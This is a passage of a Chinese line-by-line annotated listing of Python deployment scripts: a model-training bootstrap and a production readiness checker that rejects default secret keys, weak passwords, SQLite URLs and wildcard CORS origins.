| 59 | 循环：逐个处理集合或迭代器中的元素。 | `    for name, ready in status.items():` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flag = "READY  " if ready else "MISSING"` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        expected = ", ".join(EXPECTED_ARTIFACTS[name])` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"  [{flag}] {name:10s}  期望: {expected}")` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(description="首次部署模型引导")` |
| 67 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument("--auto", action="store_true", help="自动训练缺失的模型")` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument("--check", action="store_true", help="仅检查不训练")` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = parser.parse_args()` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.makedirs(SAVED_DIR, exist_ok=True)` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status = _status()` |
| 73 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _print_status(status)` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    missing = [name for name, ok in status.items() if not ok]` |
| 76 | 条件判断：满足条件时进入对应分支。 | `    if not missing:` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("\n所有模型已就位，无需额外操作。")` |
| 78 | 返回结果：把处理后的值交回调用方。 | `        return 0` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 条件判断：满足条件时进入对应分支。 | `    if args.check:` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"\n缺失模型: {missing}（--check 不会触发训练）")` |
| 82 | 返回结果：把处理后的值交回调用方。 | `        return 2` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 条件判断：满足条件时进入对应分支。 | `    if not args.auto:` |
| 85 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            answer = input(` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"\n检测到 {len(missing)} 个模型缺失: {missing}。"` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "是否立即训练? [y/N]: "` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).strip().lower()` |
| 90 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except EOFError:` |
| 91 | 注释：解释下面或当前这段代码的设计意图。 | `            # 非交互式环境（无 stdin）直接退出，避免阻塞` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("检测到非交互式环境，请使用 --auto 自动训练或手动运行 train_all.py")` |
| 93 | 返回结果：把处理后的值交回调用方。 | `            return 1` |
| 94 | 条件判断：满足条件时进入对应分支。 | `        if answer not in {"y", "yes"}:` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print("已取消。可稍后手动运行: python scripts/train_all.py")` |
| 96 | 返回结果：把处理后的值交回调用方。 | `            return 1` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 注释：解释下面或当前这段代码的设计意图。 | `    # 调用 train_all` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n开始一键训练...\n")` |
| 100 | 导入对象：从指定模块引入类、函数或常量。 | `    from scripts import train_all  # noqa: WPS433` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    only = ",".join(missing)` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sys.argv = ["train_all.py", "--only", only]` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ret = train_all.main()` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    post_status = _status()` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _print_status(post_status)` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    still_missing = [n for n, ok in post_status.items() if not ok and n in missing]` |
| 108 | 条件判断：满足条件时进入对应分支。 | `    if still_missing:` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"\n部分模型训练未完成: {still_missing}")` |
| 110 | 返回结果：把处理后的值交回调用方。 | `        return 2` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n所有目标模型已训练完毕。")` |
| 112 | 返回结果：把处理后的值交回调用方。 | `    return 0 if ret == 0 else 2` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 115 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(main())` |

## `scripts/check_production_readiness.py`

- 类型：运维/训练脚本
- 行数：321

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：解释下面或当前这段代码的设计意图。 | `#!/usr/bin/env python3` |
| 2 | 文档字符串：说明当前模块、类或函数的职责。 | `"""One-shot production configuration readiness check.` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `The script reads environment variables and, by default, also reads a local` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `\`\`.env\`\` file without modifying it. Existing process environment variables win.` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `It exits with status 0 only when every production gate passes.` |
| 7 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 8 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Callable, Iterable` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = Path(__file__).resolve().parent.parent` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `FORBIDDEN_SECRET_KEYS = {` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "",` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dev-only-insecure-key-never-use-in-production",` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "test-only-secret-key",` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "changeme",` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "secret",` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "REPLACE_ME_WITH_64_HEX_CHARS",` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "your-secret-key",` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "please-change-me",` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `FORBIDDEN_PASSWORD_VALUES = {` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "admin",` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "guardian",` |
| 34 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "changeme",` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "password",` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "password123",` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "secret",` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "123456",` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "admin123",` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `DEFAULT_DATABASE_URLS = {` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "sqlite:///security.db",` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "sqlite:///data/security.db",` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "sqlite:///:memory:",` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `TRUTHY = {"1", "true", "yes", "on"}` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `FALSY = {"0", "false", "no", "off"}` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass(frozen=True)` |
| 53 | 类定义：声明 `CheckResult`，封装相关状态与行为。 | `class CheckResult:` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name: str` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok: bool` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: str` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 59 | 函数定义：声明 `_load_env_file` 的输入、处理逻辑和返回结果。 | `def _load_env_file(path: Path) -> int:` |
| 60 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Load missing KEY=VALUE pairs from an env file. Never writes the file."""` |
| 61 | 条件判断：满足条件时进入对应分支。 | `    if not path.exists():` |
| 62 | 返回结果：把处理后的值交回调用方。 | `        return 0` |
| 63 | 条件判断：满足条件时进入对应分支。 | `    if not path.is_file():` |
| 64 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(f"{path} exists but is not a file")` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    loaded = 0` |
| 67 | 循环：逐个处理集合或迭代器中的元素。 | `    for raw in path.read_text(encoding="utf-8").splitlines():` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = raw.strip()` |
| 69 | 条件判断：满足条件时进入对应分支。 | `        if not line or line.startswith("#") or "=" not in line:` |
| 70 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `        key, value = line.split("=", 1)` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = key.strip()` |
| 73 | 条件判断：满足条件时进入对应分支。 | `        if not key or key in os.environ:` |
| 74 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        value = value.strip()` |
| 76 | 条件判断：满足条件时进入对应分支。 | `        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value = value[1:-1]` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        os.environ[key] = value` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `        loaded += 1` |
| 80 | 返回结果：把处理后的值交回调用方。 | `    return loaded` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 函数定义：声明 `_env` 的输入、处理逻辑和返回结果。 | `def _env(key: str, default: str = "") -> str:` |
| 84 | 返回结果：把处理后的值交回调用方。 | `    return (os.environ.get(key, default) or "").strip()` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `_is_bool` 的输入、处理逻辑和返回结果。 | `def _is_bool(value: str) -> bool:` |
| 88 | 返回结果：把处理后的值交回调用方。 | `    return value.lower() in TRUTHY or value.lower() in FALSY` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 函数定义：声明 `_path_from_env` 的输入、处理逻辑和返回结果。 | `def _path_from_env(key: str, default: str) -> Path:` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = _env(key, default)` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    path = Path(raw)` |
| 94 | 条件判断：满足条件时进入对应分支。 | `    if not path.is_absolute():` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        path = ROOT / path` |
| 96 | 返回结果：把处理后的值交回调用方。 | `    return path` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 函数定义：声明 `check_flask_env` 的输入、处理逻辑和返回结果。 | `def check_flask_env() -> CheckResult:` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("FLASK_ENV")` |
| 101 | 条件判断：满足条件时进入对应分支。 | `    if value != "production":` |
| 102 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "FLASK_ENV",` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `            False,` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "must be exactly 'production' for this readiness gate",` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 107 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("FLASK_ENV", True, "production")` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 函数定义：声明 `check_secret_key` 的输入、处理逻辑和返回结果。 | `def check_secret_key() -> CheckResult:` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("SECRET_KEY")` |
| 112 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 113 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("SECRET_KEY", False, "missing")` |
| 114 | 条件判断：满足条件时进入对应分支。 | `    if value in FORBIDDEN_SECRET_KEYS:` |
| 115 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("SECRET_KEY", False, "uses a default/example value")` |
| 116 | 条件判断：满足条件时进入对应分支。 | `    if len(value) < 32:` |
| 117 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("SECRET_KEY", False, "must be at least 32 characters")` |
| 118 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("SECRET_KEY", True, "set and non-default")` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 函数定义：声明 `check_admin_password_hash` 的输入、处理逻辑和返回结果。 | `def check_admin_password_hash() -> CheckResult:` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("ADMIN_PASSWORD_HASH")` |
| 123 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 124 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ADMIN_PASSWORD_HASH", False, "missing")` |
| 125 | 条件判断：满足条件时进入对应分支。 | `    if value.lower() in FORBIDDEN_PASSWORD_VALUES:` |
| 126 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult(` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ADMIN_PASSWORD_HASH",` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `            False,` |
| 129 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "looks like a default/plain password instead of a hash",` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 131 | 条件判断：满足条件时进入对应分支。 | `    if not (value.startswith("pbkdf2:") or value.startswith("scrypt:")) or "$" not in value:` |
| 132 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult(` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ADMIN_PASSWORD_HASH",` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `            False,` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "must be a Werkzeug password hash generated by scripts/generate_admin_password_hash.py",` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 137 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 138 | 导入对象：从指定模块引入类、函数或常量。 | `        from werkzeug.security import check_password_hash` |
| 139 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ImportError:` |
| 140 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult(` |
| 141 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ADMIN_PASSWORD_HASH",` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `            False,` |
| 143 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "cannot validate default passwords because Werkzeug is not installed",` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 145 | 循环：逐个处理集合或迭代器中的元素。 | `    for candidate in FORBIDDEN_PASSWORD_VALUES:` |
| 146 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 147 | 条件判断：满足条件时进入对应分支。 | `            if check_password_hash(value, candidate):` |
| 148 | 返回结果：把处理后的值交回调用方。 | `                return CheckResult(` |
| 149 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "ADMIN_PASSWORD_HASH",` |
| 150 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    False,` |
| 151 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "hash matches a known default password",` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 153 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError:` |
| 154 | 返回结果：把处理后的值交回调用方。 | `            return CheckResult("ADMIN_PASSWORD_HASH", False, "hash format is invalid")` |
| 155 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("ADMIN_PASSWORD_HASH", True, "hash configured")` |
| 156 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 函数定义：声明 `check_plain_admin_password` 的输入、处理逻辑和返回结果。 | `def check_plain_admin_password() -> CheckResult:` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("ADMIN_PASSWORD")` |
| 160 | 条件判断：满足条件时进入对应分支。 | `    if value:` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason = "production must not define plaintext ADMIN_PASSWORD"` |
| 162 | 条件判断：满足条件时进入对应分支。 | `        if value.lower() in FORBIDDEN_PASSWORD_VALUES:` |
| 163 | 代码语句：参与当前文件的业务流程或数据处理。 | `            reason += "; current value is a known default"` |
| 164 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ADMIN_PASSWORD", False, reason)` |
| 165 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("ADMIN_PASSWORD", True, "not set")` |
| 166 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 函数定义：声明 `check_database_url` 的输入、处理逻辑和返回结果。 | `def check_database_url() -> CheckResult:` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("DATABASE_URL")` |
| 170 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 171 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DATABASE_URL", False, "missing")` |
| 172 | 条件判断：满足条件时进入对应分支。 | `    if value in DEFAULT_DATABASE_URLS:` |
| 173 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DATABASE_URL", False, "uses a local/default SQLite URL")` |
| 174 | 条件判断：满足条件时进入对应分支。 | `    if "://" not in value:` |
| 175 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DATABASE_URL", False, "does not look like a database URL")` |
| 176 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("DATABASE_URL", True, "configured")` |
| 177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 178 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 179 | 函数定义：声明 `check_redis_password` 的输入、处理逻辑和返回结果。 | `def check_redis_password() -> CheckResult:` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("REDIS_PASSWORD")` |
| 181 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 182 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("REDIS_PASSWORD", False, "missing")` |
| 183 | 条件判断：满足条件时进入对应分支。 | `    if value.lower() in FORBIDDEN_PASSWORD_VALUES:` |
| 184 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("REDIS_PASSWORD", False, "uses a default/weak password")` |
| 185 | 条件判断：满足条件时进入对应分支。 | `    if len(value) < 12:` |
| 186 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("REDIS_PASSWORD", False, "must be at least 12 characters")` |
| 187 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("REDIS_PASSWORD", True, "set and non-default")` |
| 188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 函数定义：声明 `check_allowed_origins` 的输入、处理逻辑和返回结果。 | `def check_allowed_origins() -> CheckResult:` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("ALLOWED_ORIGINS")` |
| 192 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 193 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ALLOWED_ORIGINS", False, "missing")` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    origins = [part.strip() for part in value.split(",") if part.strip()]` |
| 195 | 条件判断：满足条件时进入对应分支。 | `    if not origins:` |
| 196 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ALLOWED_ORIGINS", False, "contains no usable origins")` |
| 197 | 条件判断：满足条件时进入对应分支。 | `    if any(origin == "*" for origin in origins):` |
| 198 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ALLOWED_ORIGINS", False, "wildcard '*' is forbidden")` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    invalid = [` |
| 200 | 代码语句：参与当前文件的业务流程或数据处理。 | `        origin` |
| 201 | 循环：逐个处理集合或迭代器中的元素。 | `        for origin in origins` |
| 202 | 条件判断：满足条件时进入对应分支。 | `        if not (origin.lower().startswith("http://") or origin.lower().startswith("https://"))` |
| 203 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 204 | 条件判断：满足条件时进入对应分支。 | `    if invalid:` |
| 205 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("ALLOWED_ORIGINS", False, f"invalid origin: {invalid[0]}")` |
| 206 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("ALLOWED_ORIGINS", True, f"{len(origins)} origin(s) configured")` |
| 207 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 208 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 209 | 函数定义：声明 `check_dry_run` 的输入、处理逻辑和返回结果。 | `def check_dry_run(gate: ReadinessGate = "private-beta") -> CheckResult:` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("DRY_RUN")` |
| 211 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 212 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DRY_RUN", False, "missing; readiness requires an explicit true/false value")` |
| 213 | 条件判断：满足条件时进入对应分支。 | `    if not _is_bool(value):` |
| 214 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DRY_RUN", False, "must be true or false")` |
| 215 | 条件判断：满足条件时进入对应分支。 | `    if gate == "real-enforcement":` |
| 216 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("DRY_RUN", False, "must be false for real-enforcement readiness")` |
| 217 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("DRY_RUN", True, "true; private Beta runs in non-enforcing mode")` |
| 218 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 219 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 220 | 函数定义：声明 `check_model_dir` 的输入、处理逻辑和返回结果。 | `def check_model_dir() -> CheckResult:` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir = _path_from_env("MODEL_DIR", "models/saved")` |
| 222 | 条件判断：满足条件时进入对应分支。 | `    if not model_dir.exists():` |
| 223 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("MODEL_DIR", False, f"directory does not exist: {model_dir}")` |
| 224 | 条件判断：满足条件时进入对应分支。 | `    if not model_dir.is_dir():` |
| 225 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("MODEL_DIR", False, f"not a directory: {model_dir}")` |
| 226 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        has_content = any(model_dir.iterdir())` |
| 228 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except OSError as exc:` |
| 229 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("MODEL_DIR", False, f"cannot read directory: {exc}")` |
| 230 | 条件判断：满足条件时进入对应分支。 | `    if not has_content:` |
| 231 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("MODEL_DIR", False, f"directory is empty: {model_dir}")` |
| 232 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("MODEL_DIR", True, f"directory exists: {model_dir}")` |
| 233 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 234 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 235 | 函数定义：声明 `check_log_integrity` 的输入、处理逻辑和返回结果。 | `def check_log_integrity() -> CheckResult:` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = _env("LOG_INTEGRITY_ENABLED")` |
| 237 | 条件判断：满足条件时进入对应分支。 | `    if not value:` |
| 238 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_INTEGRITY_ENABLED", False, "missing; production must set true")` |
| 239 | 条件判断：满足条件时进入对应分支。 | `    if not _is_bool(value):` |
| 240 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_INTEGRITY_ENABLED", False, "must be true or false")` |
| 241 | 条件判断：满足条件时进入对应分支。 | `    if value.lower() not in TRUTHY:` |
| 242 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_INTEGRITY_ENABLED", False, "must be true in production")` |
| 243 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("LOG_INTEGRITY_ENABLED", True, "true")` |
| 244 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 245 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 246 | 函数定义：声明 `check_log_dir` 的输入、处理逻辑和返回结果。 | `def check_log_dir() -> CheckResult:` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    log_dir = _path_from_env("LOG_DIR", "logs")` |
| 248 | 条件判断：满足条件时进入对应分支。 | `    if not log_dir.exists():` |
| 249 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_DIR", False, f"directory does not exist: {log_dir}")` |
